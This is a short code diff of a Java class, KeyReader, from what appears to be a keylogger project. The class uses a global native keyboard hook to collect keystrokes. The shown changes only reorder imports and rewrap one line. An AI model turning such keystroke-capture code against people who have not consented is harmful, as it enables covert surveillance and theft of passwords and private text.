@@ -1,16 +1,15 @@
 package com.mossad.keylogger.reader;
 
 import com.mmigdal.mossad.key.logger.library.KeyLoggerEntries;
-
-import org.jnativehook.keyboard.NativeKeyEvent;
-import org.jnativehook.keyboard.NativeKeyListener;
-
 import java.util.ArrayList;
 import java.util.List;
+import org.jnativehook.keyboard.NativeKeyEvent;
+import org.jnativehook.keyboard.NativeKeyListener;
 
 public class KeyReader implements NativeKeyListener {
 
     private List<String> readSigns;
+
     public KeyReader() {
         readSigns = new ArrayList<>();
     }
@@ -61,7 +60,8 @@ public class KeyReader implements NativeKeyListener {
     }
 
     private String generateShiftEntry(String entry) {
-        return  new StringBuilder().append(KeyLoggerEntries.SIGN_SPACE).append(entry).append(KeyLoggerEntries.SIGN_SPACE).toString();
+        return new StringBuilder().append(KeyLoggerEntries.SIGN_SPACE).append(entry).append(KeyLoggerEntries.SIGN_SPACE)
+            .toString();
     }
 
     private boolean isSpace(String keyText) {
